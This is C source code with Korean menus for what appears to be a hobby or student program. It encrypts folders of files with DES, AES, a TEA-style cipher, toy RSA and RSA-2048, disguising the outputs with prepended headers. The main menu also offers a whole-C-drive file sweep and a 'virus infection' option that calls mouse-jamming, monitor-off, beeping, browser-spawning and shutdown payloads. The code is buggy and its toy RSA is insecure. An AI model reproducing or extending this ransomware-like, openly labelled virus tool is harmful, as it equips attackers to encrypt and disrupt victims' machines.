#include <stdio.h>
#include <Windows.h>
#include <io.h>
#include <conio.h>
#include <string.h>
#include <stdlib.h>
#include  "aes.h"
#include "des.h"
#include "tiny.h"
#include "base64.h"
#include "common.h"
#include "rsa2048.h"
#include "findfile.h"
#include "infec_findfile.h"
#include "virus_folder.h"

#define P	13
#define	Q	17
#define N	(P*Q)	
#define Z	((P - 1)*(Q - 1))
#define E	5		
#define D 77

char folder[260];
void aes_fold_find()
{
	struct _finddata_t fd;
	long handle;
	int result = 1, count = 0, len = 0, j = 0, i;
	char str[260] = "", folder1[260], folder2[260], a[260], b[260];
	unsigned char* data_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char*  prossed_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char* aes_key = (unsigned char*)malloc(17 * sizeof(char));
	printf("암호화할 폴더 입력하시오:");
	scanf("%s", folder);
	sprintf(folder1, "%s\\*.*", folder);
	printf("key 16:");
	scanf("%s", aes_key);

	handle = _findfirst(folder1, &fd);
	if (handle == -1)
	{
		printf("There were no files.\n");
		return;
	}
	while (result != -1)
	{
		sprintf(folder2, ".\\%s\\%s", folder, fd.name);
		strcpy(str, folder2);
		FILE *input_file = fopen(str, "rb");
		if (input_file == NULL)
		{
			result = _findnext(handle, &fd);
			continue;
		}
		len = strlen(str);
		j = 0;
		for (i = len - 3; i < len; i++)
		{
			a[j] = str[i];
			j++;
		}
		if (a[0] == 'e')
		{
			sprintf(str, ".\\%s\\en_%s_.exe", folder, fd.name);
			strcpy(b, "title.exe");
		}
		else if (a[0] == 'P')
		{
			sprintf(str, ".\\%s\\en_%s_.PNG", folder, fd.name);
			strcpy(b, "title.PNG");
		}
		else
		{
			sprintf(str, ".\\%s\\en_%s_.txt", folder, fd.name);
			strcpy(b, "title.txt");
		}
		FILE *output_file = fopen(str, "wb");
		FILE *en_file = fopen(b, "rb");
		if (fd.size != 0)
		{
			while (fread(data_block, 1, 16, en_file))
			{
				fwrite(data_block, 1, 16, output_file);
				memset(data_block, 0, 16);
			}
			while (fread(data_block, 1, 16, input_file))
			{
				AES_ECB_encrypt(data_block, aes_key, prossed_block, 16);
				fwrite(prossed_block, 1, 16, output_file);
				memset(data_block, 0, 16);
				memset(prossed_block, 0, 16);
			}
		}
		printf("File: %s %d\n", fd.name, fd.size);
		result = _findnext(handle, &fd);
		rewind(en_file);
		fclose(input_file);
		fclose(output_file);
		getchar();
	}
	_findclose(handle);
	return;
}
void aes_fold_re()
{
	struct _finddata_t fd;
	long handle;
	int result = 1, len = 0, i, j;
	char str[260] = "", str1[260] = "", folder1[260] = "", folder2[260], a[260], b[260];
	unsigned char* data_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char*  prossed_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char* aes_key = (unsigned char*)malloc(17 * sizeof(char));
	printf("복호화할 폴더 입력하시오:");
	scanf("%s", folder);
	sprintf(folder1, "%s\\*.*", folder);
	printf("key 16:");
	scanf("%s", aes_key);

	handle = _findfirst(folder1, &fd);
	if (handle == -1)
	{
		printf("There were no files.\n");
		return;
	}
	while (result != -1)
	{
		sprintf(folder2, ".\\%s\\%s", folder, fd.name);
		strcpy(str, folder2);
		FILE *input_file = fopen(str, "rb");
		if (input_file == NULL)
		{
			result = _findnext(handle, &fd);
			continue;
		}
		strcpy(str, fd.name);
		len = strlen(str);
		for (i = 3; i < len; i++)
			str[i - 3] = str[i];
		str[len - 8] = '\0';

		len = strlen(str);
		j = 0;
		for (i = len - 3; i < len; i++)
		{
			a[j] = str[i];
			j++;
		}
		if (a[0] == 'e')
		{
			strcpy(b, "title.exe");
		}
		else if (a[0] == 'P')
		{
			strcpy(b, "title.PNG");
		}
		else
		{
			strcpy(b, "title.txt");
		}
		sprintf(str1, ".\\%s\\%s", folder, str);
		FILE *output_file = fopen(str1, "wb");
		FILE *en_file = fopen(b, "rb");
		if (fd.size != 0)
		{
			while (fread(data_block, 1, 16, en_file))
			{
				fread(data_block, 1, 16, input_file);
				memset(data_block, 0, 16);
			}
			while (fread(data_block, 1, 16, input_file))
			{
				AES_ECB_decrypt(data_block, aes_key, prossed_block, 16);
				fwrite(prossed_block, 1, 16, output_file);
				memset(data_block, 0, 16);
				memset(prossed_block, 0, 16);
			}
		}
		printf("File: %s %d\n", fd.name, fd.size);
		result = _findnext(handle, &fd);
		rewind(en_file);
		fclose(input_file);
		fclose(output_file);
		getchar();
	}
	_findclose(handle);
	return;
}
void des_fold_find()
{
	struct _finddata_t fd;
	long handle;
	int result = 1, len = 0, i, j;
	char str[260] = "", folder1[260], folder2[260], a[4], b[260];
	unsigned char* data_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char*  prossed_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char* des_key = (unsigned char*)malloc(9 * sizeof(char));
	printf("암호화할 폴더 입력하시오:");
	scanf("%s", folder);
	sprintf(folder1, "%s\\*.*", folder);
	printf("key 8:");
	scanf("%s", des_key);

	handle = _findfirst(folder1, &fd);
	if (handle == -1)
	{
		printf("There were no files.\n");
		return;
	}
	while (result != -1)
	{
		sprintf(folder2, ".\\%s\\%s", folder, fd.name);
		strcpy(str, folder2);
		FILE *input_file = fopen(str, "rb");
		if (input_file == NULL)
		{
			result = _findnext(handle, &fd);
			continue;
		}
		len = strlen(str);
		j = 0;
		for (i = len - 3; i < len; i++)
		{
			a[j] = str[i];
			j++;
		}
		if (a[0] == 'e')
		{
			sprintf(str, ".\\%s\\en_%s_.exe", folder, fd.name);
			strcpy(b, "title.exe");
		}
		else if (a[0] == 'P')
		{
			sprintf(str, ".\\%s\\en_%s_.PNG", folder, fd.name);
			strcpy(b, "title.PNG");
		}
		else
		{
			sprintf(str, ".\\%s\\en_%s_.txt", folder, fd.name);
			strcpy(b, "title.txt");
		}
		FILE *output_file = fopen(str, "wb");
		FILE *en_file = fopen(b, "rb");
		if (fd.size != 0)
		{
			while (fread(data_block, 1, 8, en_file))
			{
				fwrite(data_block, 1, 8, output_file);
				memset(data_block, 0, 8);
			}
			while (fread(data_block, 1, 8, input_file))
			{
				Des_En(data_block, des_key, prossed_block);
				fwrite(prossed_block, 1, 8, output_file);
				memset(data_block, 0, 8);
				memset(prossed_block, 0, 8);
			}
		}
		printf("File: %s %d\n", fd.name, fd.size);
		result = _findnext(handle, &fd);
		rewind(en_file);
		fclose(input_file);
		fclose(output_file);
		getchar();
	}
	_findclose(handle);
	return;
}
void des_fold_re()
{
	struct _finddata_t fd;
	long handle;
	int result = 1, len = 0, i, j;
	char str[260] = "", str1[260] = "", folder1[260], folder2[260], a[4], b[260];
	unsigned char* data_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char*  prossed_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char* des_key = (unsigned char*)malloc(9 * sizeof(char));
	printf("복호화할 폴더 입력하시오:");
	scanf("%s", folder);
	sprintf(folder1, "%s\\*.*", folder);
	printf("key 8:");
	scanf("%s", des_key);

	handle = _findfirst(folder1, &fd);
	if (handle == -1)
	{
		printf("There were no files.\n");
		return;
	}
	while (result != -1)
	{
		sprintf(folder2, ".\\%s\\%s", folder, fd.name);
		strcpy(str, folder2);
		FILE *input_file = fopen(str, "rb");
		if (input_file == NULL)
		{
			result = _findnext(handle, &fd);
			continue;
		}
		strcpy(str, fd.name);
		len = strlen(str);
		for (i = 3; i < len; i++)
			str[i - 3] = str[i];
		str[len - 8] = '\0';

		len = strlen(str);
		j = 0;
		for (i = len - 3; i < len; i++)
		{
			a[j] = str[i];
			j++;
		}
		if (a[0] == 'e')
		{
			strcpy(b, "title.exe");
		}
		else if (a[0] == 'P')
		{
			strcpy(b, "title.PNG");
		}
		else
		{
			strcpy(b, "title.txt");
		}
		sprintf(str1, ".\\%s\\%s", folder, str);
		FILE *output_file = fopen(str1, "wb");
		FILE *en_file = fopen(b, "rb");
		if (fd.size != 0)
		{
			while (fread(data_block, 1, 8, en_file))
			{
				fread(data_block, 1, 8, input_file);
				memset(data_block, 0, 8);
			}
			while (fread(data_block, 1, 8, input_file))
			{
				Des_De(data_block, des_key, prossed_block);
				fwrite(prossed_block, 1, 8, output_file);
				memset(data_block, 0, 8);
				memset(prossed_block, 0, 8);
			}
		}
		printf("File: %s %d\n", fd.name, fd.size);
		result = _findnext(handle, &fd);
		rewind(en_file);
		fclose(input_file);
		fclose(output_file);
		getchar();
	}
	_findclose(handle);
	return;
}
void tiny_fold_find()
{
	struct _finddata_t fd;
	long handle;
	int result = 1, i, j, len = 0;
	char str[260] = "", folder1[260], folder2[260], a[4], b[260];
	FILE *en_file = fopen("title.exe", "rb");
	unsigned char* data_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char*  prossed_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char* tiny_key = (unsigned char*)malloc(17 * sizeof(char));
	printf("암호화할 폴더 입력하시오:");
	scanf("%s", folder);
	sprintf(folder1, "%s\\*.*", folder);
	printf("key 16:");
	scanf("%s", tiny_key);

	handle = _findfirst(folder1, &fd);
	if (handle == -1)
	{
		printf("There were no files.\n");
		return;
	}
	while (result != -1)
	{
		sprintf(folder2, ".\\%s\\%s", folder, fd.name);
		strcpy(str, folder2);
		FILE *input_file = fopen(str, "rb");
		if (input_file == NULL)
		{
			result = _findnext(handle, &fd);
			continue;
		}
		len = strlen(str);
		j = 0;
		for (i = len - 3; i < len; i++)
		{
			a[j] = str[i];
			j++;
		}
		if (a[0] == 'e')
		{
			sprintf(str, ".\\%s\\en_%s_.exe", folder, fd.name);
			strcpy(b, "title.exe");
		}
		else if (a[0] == 'P')
		{
			sprintf(str, ".\\%s\\en_%s_.PNG", folder, fd.name);
			strcpy(b, "title.PNG");
		}
		else
		{
			sprintf(str, ".\\%s\\en_%s_.txt", folder, fd.name);
			strcpy(b, "title.txt");
		}
		FILE *output_file = fopen(str, "wb");
		FILE *en_file = fopen(b, "rb");
		if (fd.size != 0)
		{
			while (fread(data_block, 1, 8, en_file))
			{
				fwrite(data_block, 1, 8, output_file);
				memset(data_block, 0, 8);
			}
			while (fread(data_block, 1, 8, input_file))
			{
				memcpy(prossed_block, data_block, 8);
				tiny_en(prossed_block, tiny_key);
				fwrite(prossed_block, 1, 8, output_file);
				memset(data_block, 0, 8);
				memset(prossed_block, 0, 8);
			}
		}
		printf("File: %s %d\n", fd.name, fd.size);
		result = _findnext(handle, &fd);
		rewind(en_file);
		fclose(input_file);
		fclose(output_file);
		getchar();
	}
	_findclose(handle);
	return;
}
void tiny_fold_re()
{
	struct _finddata_t fd;
	long handle;
	int result = 1, len = 0, i, j;
	char str[260] = "", str1[260] = "", folder1[260], folder2[260], a[260], b[260];
	FILE *en_file = fopen("title.exe", "rb");
	unsigned char* data_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char*  prossed_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char* tiny_key = (unsigned char*)malloc(17 * sizeof(char));
	printf("복호화할 폴더 입력하시오:");
	scanf("%s", folder);
	sprintf(folder1, "%s\\*.*", folder);
	printf("key 16:");
	scanf("%s", tiny_key);

	handle = _findfirst(folder1, &fd);
	if (handle == -1)
	{
		printf("There were no files.\n");
		return;
	}
	while (result != -1)
	{
		sprintf(folder2, ".\\%s\\%s", folder, fd.name);
		strcpy(str, folder2);
		FILE *input_file = fopen(str, "rb");
		if (input_file == NULL)
		{
			result = _findnext(handle, &fd);
			continue;
		}
		strcpy(str, fd.name);
		len = strlen(str);
		for (i = 3; i < len; i++)
			str[i - 3] = str[i];
		str[len - 8] = '\0';

		len = strlen(str);
		j = 0;
		for (i = len - 3; i < len; i++)
		{
			a[j] = str[i];
			j++;
		}
		if (a[0] == 'e')
		{
			strcpy(b, "title.exe");
		}
		else if (a[0] == 'P')
		{
			strcpy(b, "title.PNG");
		}
		else
		{
			strcpy(b, "title.txt");
		}
		sprintf(str1, ".\\%s\\%s", folder, str);
		FILE *output_file = fopen(str1, "wb");
		FILE *en_file = fopen(b, "rb");
		if (fd.size != 0)
		{
			while (fread(data_block, 1, 8, en_file))
			{
				fread(data_block, 1, 8, input_file);
				memset(data_block, 0, 8);
			}
			while (fread(data_block, 1, 8, input_file))
			{
				memcpy(prossed_block, data_block, 8);
				tiny_de(prossed_block, tiny_key);
				fwrite(prossed_block, 1, 8, output_file);
				memset(data_block, 0, 8);
				memset(prossed_block, 0, 8);
			}
		}
		printf("File: %s %d\n", fd.name, fd.size);
		result = _findnext(handle, &fd);
		rewind(en_file);
		fclose(input_file);
		fclose(output_file);
		getchar();
	}
	_findclose(handle);
	return;
}
void Rsa_fold_find()
{
	struct _finddata_t fd;
	long handle;
	int result = 1, len = 0, i, j, en, value;
	char str[260] = "", folder1[260], folder2[260], a[4], b[260];
	unsigned char* data_block = (unsigned char*)malloc(16 * sizeof(char));
	printf("암호화할 폴더 입력하시오:");
	scanf("%s", folder);
	sprintf(folder1, "%s\\*.*", folder);

	handle = _findfirst(folder1, &fd);
	if (handle == -1)
	{
		printf("There were no files.\n");
		return;
	}
	while (result != -1)
	{
		sprintf(folder2, ".\\%s\\%s", folder, fd.name);
		strcpy(str, folder2);
		FILE *input_file = fopen(str, "rb");
		if (input_file == NULL)
		{
			result = _findnext(handle, &fd);
			continue;
		}
		len = strlen(str);
		j = 0;
		for (i = len - 3; i < len; i++)
		{
			a[j] = str[i];
			j++;
		}
		if (a[0] == 'e')
		{
			sprintf(str, ".\\%s\\en_%s_.exe", folder, fd.name);
			strcpy(b, "title.exe");
		}
		else if (a[0] == 'P')
		{
			sprintf(str, ".\\%s\\en_%s_.PNG", folder, fd.name);
			strcpy(b, "title.PNG");
		}
		else
		{
			sprintf(str, ".\\%s\\en_%s_.txt", folder, fd.name);
			strcpy(b, "title.txt");
		}
		FILE *output_file = fopen(str, "wb");
		FILE *en_file = fopen(b, "rb");
		if (fd.size != 0)
		{
			while (fread(data_block, 1, 8, en_file))
			{
				fwrite(data_block, 1, 8, output_file);
				memset(data_block, 0, 8);
			}
			while (!feof(input_file))
			{
				en = value = fgetc(input_file);
				if (en == '\0') break;
				for (j = 0; j < E - 1; j++)
					en = (en*value) % N;
				fputc(en, output_file);
			}
		}
		printf("File: %s %d\n", fd.name, fd.size);
		result = _findnext(handle, &fd);
		rewind(en_file);
		fclose(input_file);
		fclose(output_file);
		getchar();
	}
}
void Rsa_fold_re()
{
	struct _finddata_t fd;
	long handle;
	int result = 1, len = 0, i, j, value, de;
	char str[260] = "", str1[260] = "", folder1[260], folder2[260], a[260], b[260];
	FILE *en_file = fopen("title.exe", "rb");
	unsigned char* data_block = (unsigned char*)malloc(16 * sizeof(char));
	printf("복호화할 폴더 입력하시오:");
	scanf("%s", folder);
	sprintf(folder1, "%s\\*.*", folder);

	handle = _findfirst(folder1, &fd);
	if (handle == -1)
	{
		printf("There were no files.\n");
		return;
	}
	while (result != -1)
	{
		sprintf(folder2, ".\\%s\\%s", folder, fd.name);
		strcpy(str, folder2);
		FILE *input_file = fopen(str, "rb");
		if (input_file == NULL)
		{
			result = _findnext(handle, &fd);
			continue;
		}
		strcpy(str, fd.name);
		len = strlen(str);
		for (i = 3; i < len; i++)
			str[i - 3] = str[i];
		str[len - 8] = '\0';

		len = strlen(str);
		j = 0;
		for (i = len - 3; i < len; i++)
		{
			a[j] = str[i];
			j++;
		}
		if (a[0] == 'e')
		{
			strcpy(b, "title.exe");
		}
		else if (a[0] == 'P')
		{
			strcpy(b, "title.PNG");
		}
		else
		{
			strcpy(b, "title.txt");
		}
		sprintf(str1, ".\\%s\\%s", folder, str);
		FILE *output_file = fopen(str1, "wb");
		FILE *en_file = fopen(b, "rb");
		if (fd.size != 0)
		{
			while (fread(data_block, 1, 8, en_file))
			{
				fread(data_block, 1, 8, input_file);
				memset(data_block, 0, 8);
			}
			while (!feof(input_file))
			{
				de = value = fgetc(input_file);
				for (j = 0; j < D - 1; j++)
					de = (de*value) % N;
				if (de == '\"') break;
				fputc(de, output_file);
			}
		}
		printf("File: %s %d\n", fd.name, fd.size);
		result = _findnext(handle, &fd);
		rewind(en_file);
		fclose(input_file);
		fclose(output_file);
		getchar();
	}
	_findclose(handle);
	return;
}
void Rsa2048_fold()
{
	struct _finddata_t fd;
	struct _finddata_t fd1;
	long handle;
	HCRYPTPROV hCryptProv = 0;
	HCRYPTKEY key = 0;
	unsigned long cLen = 0;
	unsigned char *cipherText = (unsigned char*)malloc(344 * sizeof(char));
	unsigned char *plainText = (unsigned char*)malloc(8 * sizeof(char));
	unsigned char *decrypted =  (unsigned char*)malloc(8 * sizeof(char));
	unsigned char *publicKey = 0;
	unsigned char *privateKey = 0;
	char str[260] = "", filename[260] = "";
	int result = 1, len = 0, i;

	FILE *en_file = fopen("title.txt", "rb");
	FILE *en_file1 = fopen("title.txt", "rb");


	if (!CryptoInit(&key, &hCryptProv, &publicKey, &privateKey))
	{
	printf("Crypto initializing failed\n");
	return EXIT_FAILURE;
	}

	handle = _findfirst(".\\RSA\\ori\\*.*", &fd);
	if (handle == -1)
	{
	printf("There were no files.\n");
	return;
	}

	while (result != -1)
	{
	sprintf(filename, ".\\RSA\\ori\\%s", fd.name);
	FILE *input_file = fopen(filename, "rb");
	if (input_file == NULL)
	{
	result = _findnext(handle, &fd);
	continue;
	}
	sprintf(str, ".\\RSA\\en\\en_%s", fd.name);
	FILE *output_file = fopen(str, "wb");
	if (fd.size != 0)
	{
	while (fread(plainText, 1, 8, en_file))
	{
	fwrite(plainText, 1, 8, output_file);
	memset(plainText, 0, 8);
	}
	while (fread(plainText, 1, 8, input_file))
	{
	if (!Encrypt(key, &cipherText, &cLen, (unsigned char *)plainText, strlen(plainText)))
	{
	printf("Encryption failed\n");
	if (hCryptProv) CryptReleaseContext(hCryptProv, 0);
	return EXIT_FAILURE;
	}
	printf("plainText:%s \n", plainText);
	printf("cipherText:%s\n", cipherText);
	fwrite(cipherText, 1, cLen, output_file);
	}
	}
	rewind(en_file);
	fclose(input_file);
	fclose(output_file);
	result = _findnext(handle, &fd);
	}
	_findclose(handle);
	fclose(en_file);
	result = 1;

	handle = _findfirst(".\\RSA\\en\\en*.*", &fd1);
	if (handle == -1)
	{
	printf("There were no files.\n");
	return;
	}
	while (result != -1)
	{
	sprintf(filename, ".\\RSA\\en\\%s", fd1.name);
	FILE *input_file1 = fopen(filename, "rb");
	if (input_file1 == NULL)
	{
	result = _findnext(handle, &fd1);
	continue;
	}
	strcpy(str, fd1.name);
	len = strlen(str);
	for (i = 3; i < len; i++)
	str[i - 3] = str[i];
	str[len - 3] = '\0';
	sprintf(filename, ".\\RSA\\de\\de_%s",str);
	FILE *output_file1 = fopen(filename, "wb");

	if (fd1.size != 0)
	{
	while (fread(cipherText, 1, 8, en_file1))
	{
	fread(cipherText, 1, 8, input_file1);
	memset(cipherText, 0, 8);
	}
	while (fread(cipherText, 1, cLen, input_file1))
	{
	if (!Decrypt(key, &decrypted, cipherText, cLen))
	{
	printf("Decryption failed\n");
	SAFE_FREE(cipherText);
	if (hCryptProv) CryptReleaseContext(hCryptProv, 0);
	return EXIT_FAILURE;
	}
	printf("cipherText:%s\n", cipherText);
	printf("decrypted:%s\n", decrypted);
	fwrite(decrypted, 1, 8, output_file1);
	}
	}
	rewind(en_file1);
	fclose(input_file1);
	fclose(output_file1);
	result = _findnext(handle, &fd1);
	}

	SAFE_FREE(cipherText);
	SAFE_FREE(decrypted);

	CryptoUninit(key, hCryptProv);

	SAFE_FREE(publicKey);
	SAFE_FREE(privateKey);

	return EXIT_SUCCESS;
	}

void tiny_fold_en()
{
	struct _finddata_t fd;
	long handle;
	int result = 1, i, len = 0, j;
	char str[260] = "", target[260] = "", a[260], b[260];
	unsigned char* data_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char*  prossed_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char* key = (unsigned char*)malloc(17 * sizeof(char));
	printf("key 16:");
	scanf("%s", key);

	handle = _findfirst("*.*", &fd);
	if (handle == -1)
	{
		printf("There were no files.\n");
		return;
	}
	while (result != -1)
	{
		sprintf(str, ".\\.%s", fd.name);
		FILE *input_file = fopen(fd.name, "rb");
		if (input_file == NULL)
		{
			result = _findnext(handle, &fd);
			continue;
		}
		len = strlen(str);
		j = 0;
		for (i = len - 3; i < len; i++)
		{
			a[j] = str[i];
			j++;
		}
		if (a[0] == 'e')
		{
			sprintf(str, "en_%s_.exe", fd.name);
			strcpy(b, "title.exe");
		}
		else if (a[0] == 'P')
		{
			sprintf(str, "en_%s_.PNG", fd.name);
			strcpy(b, "title.PNG");
		}
		else
		{
			sprintf(str, "en_%s_.txt", fd.name);
			strcpy(b, "title.txt");
		}
		FILE *output_file = fopen(str, "wb");
		FILE *en_file = fopen(b, "rb");
		while (fread(data_block, 1, 8, en_file))
		{
			fread(data_block, 1, 8, input_file);
			memset(data_block, 0, 8);
		}
		while (fread(data_block, 1, 8, input_file))
		{
			memcpy(prossed_block, data_block, 8);
			tiny_en(prossed_block, key);
			fwrite(prossed_block, 1, 8, output_file);
			memset(data_block, 0, 8);
			memset(prossed_block, 0, 8);
		}
		printf("File:%s\n", fd.name);
		result = _findnext(handle, &fd);
		rewind(en_file);
		fclose(input_file);
		fclose(output_file);
		getchar();
	}
	_findclose(handle);
	return;
}
void tiny_fold_de()
{
	struct _finddata_t fd;
	long handle;
	int result = 1, i, len = 0, j;
	char str[260] = "", target[260] = "", a[260], b[260], str1[260];
	unsigned char* data_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char*  prossed_block = (unsigned char*)malloc(16 * sizeof(char));
	unsigned char* key = (unsigned char*)malloc(17 * sizeof(char));
	printf("key 16:");
	scanf("%s", key);

	handle = _findfirst("*.*", &fd);
	if (handle == -1)
	{
		printf("There were no files.\n");
		return;
	}
	while (result != -1)
	{
		FILE *input_file = fopen(fd.name, "rb");
		if (input_file == NULL)
		{
			result = _findnext(handle, &fd);
			continue;
		}
		strcpy(str, fd.name);
		len = strlen(str);
		for (i = 3; i < len; i++)
			str[i - 3] = str[i];
		str[len - 8] = '\0';

		len = strlen(str);
		j = 0;
		for (i = len - 3; i < len; i++)
		{
			a[j] = str[i];
			j++;
		}
		if (a[0] == 'e')
		{
			strcpy(b, "title.exe");
		}
		else if (a[0] == 'P')
		{
			strcpy(b, "title.PNG");
		}
		else
		{
			strcpy(b, "title.txt");
		}
		sprintf(str1, "%s", str);
		FILE *output_file = fopen(str1, "wb");
		FILE *en_file = fopen(b, "rb");
		if (fd.size != 0)
		{
			while (fread(data_block, 1, 8, en_file))
			{
				fread(data_block, 1, 8, input_file);
				memset(data_block, 0, 8);
			}
			while (fread(data_block, 1, 8, input_file))
			{
				memcpy(prossed_block, data_block, 8);
				tiny_de(prossed_block, key);
				fwrite(prossed_block, 1, 8, output_file);
				memset(data_block, 0, 8);
				memset(prossed_block, 0, 8);
			}
		}
		printf("File: %s %d\n", fd.name, fd.size);
		result = _findnext(handle, &fd);
		rewind(en_file);
		fclose(input_file);
		fclose(output_file);
		getchar();
	}
	_findclose(handle);
	return;
}
void virus(char source[])
{
	int menu;
	printf("------------------------\n");
	printf("--1.crazy mouse\n");
	printf("--2.모니터 꺼짐\n");
	printf("--3.경고음\n");
	printf("--4.인터넷 창\n");
	printf("--5.shutdown\n");
	printf("-----------------------\n");
	scanf("%d", &menu);
	switch (menu)
	{
	case 1:
		CrazyMouse(source); break;
	case 2:
		Hibernation(source); break;
	case 3:
		Beeper(source); break;
	case 4:
		iexplore(source); break;
	case 5:
		virus_shutdown(source); break;
	default:
		break;
	}
}

void des()
{
	int menu;
	printf("----------\n");
	printf("1.암호화\n");
	printf("2. 복호화\n");
	printf("----------\n");
	scanf("%d", &menu);
	switch (menu)
	{
	case 1:
		des_fold_find();
		break;
	case 2:
		des_fold_re();
		break;
	}
}
void aes()
{
	int menu;
	printf("----------\n");
	printf("1.암호화\n");
	printf("2. 복호화\n");
	printf("----------\n");
	scanf("%d", &menu);
	switch (menu)
	{
	case 1:
		aes_fold_find();
		break;
	case 2:
		aes_fold_re();
		break;
	}
}
void tiny()
{
	int menu;
	printf("----------\n");
	printf("1.암호화\n");
	printf("2. 복호화\n");
	printf("----------\n");
	scanf("%d", &menu);
	switch (menu)
	{
	case 1:
		tiny_fold_find();
		break;
	case 2:
		tiny_fold_re();
		break;
	}
}
void tiny2()
{
	int menu;
	printf("----------\n");
	printf("1.암호화\n");
	printf("2. 복호화\n");
	printf("----------\n");
	scanf("%d", &menu);
	switch (menu)
	{
	case 1:
		tiny_fold_en();
		break;
	case 2:
		tiny_fold_de();
		break;
	}
}
void rsa()
{
	int menu;
	printf("----------\n");
	printf("1.암호화\n");
	printf("2. 복호화\n");
	printf("----------\n");
	scanf("%d", &menu);
	switch (menu)
	{
	case 1:
		Rsa_fold_find();
		break;
	case 2:
		Rsa_fold_re();
		break;
	}
}

int main(int argc, int *argv[])
{
	int menu;
	printf("------------------------------\n");
	printf("-1.Des를 이용한 암호화/복호화\n");
	printf("-2.Aes를 이용한 암호화/복호화\n");
	printf("-3.Tiny를 이용한 암호화/복호화\n");
	printf("-4.Rsa를 이용한 암호화/복호화\n");
	printf("-5.Rsa2048을 이용한 암호화/복호화\n");
	printf("-6.폴더 암호화/복호화         \n");
	printf("-7.C드라이브 모든 파일    \n");
	printf("-8.바이러스 감염 \n");
	printf("-9.종료        \n");
	printf("------------------------------\n");
	scanf("%d", &menu);
	switch (menu)
	{
	case 1:
		des(); break;
	case 2:
		aes(); break;
	case 3:
		tiny(); break;
	case 4:
		rsa(); break;
	case 5:
		Rsa2048_fold();
		break;
	case 6:
		tiny2(); break;
	case 7:
		findfile("c:\\*.*");
		break;
	case 8:
		virus(argv[0]);
		break;
	default:
		break;
	}
}